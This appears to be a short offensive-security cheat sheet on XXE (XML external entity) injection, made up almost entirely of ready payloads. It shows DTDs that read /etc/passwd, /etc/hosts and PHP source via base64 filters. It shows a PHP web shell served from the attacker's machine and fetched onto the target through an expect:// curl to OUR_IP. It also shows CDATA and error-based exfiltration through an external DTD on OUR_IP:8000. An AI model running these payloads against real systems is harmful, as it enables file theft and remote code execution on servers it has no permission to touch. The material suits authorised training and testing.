# Local File Disclosure
## Identifying
First of all, we have to see if the request is sending in XML format
To start fo the testing we can add in the second line or after of <?xml version="x.x" encoding="xxxx"?>
```bash
<!DOCTYPE "SECTION" [
  <!ENTITY "Dynamic Word" "Inlane Freight">
]>
```
## Reading Sensitive Files
```bash
<!DOCTYPE "SECTION" [
  <!ENTITY "Dynamic Word" SYSTEM "file:///etc/passwd">
]>
```
## Reading Source Code
It's better endoced to base64, because the code could have speacial caracters that break the Response
```bash
<!DOCTYPE "SECTION" [
  <!ENTITY "Dynamic Word" SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
## Remote Code Execution with XXE
Creating connection
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
Payload
```bash
<!DOCTYPE "SECTION"[
  <!ENTITY "Dynamic Word" SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
## Example
```bash
<?xml version="1.0"?>
#Section Name
<!DOCTYPE email [ 
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
# Dynamic word
<email>&company;</email>
<message></message>
</root>
```

# Advanced File Disclosure
```bash
<!DOCTYPE "SECTION"[
  <!ENTITY "Dynamic Word" SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
## CDATA
``` bash
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>

# File
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

## Error Based XXE
<img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/e4859438-5010-4ca5-8576-084519400caa" />
- Example
LFI
``` bash
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>"> 
```
RCE
``` bash
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

```
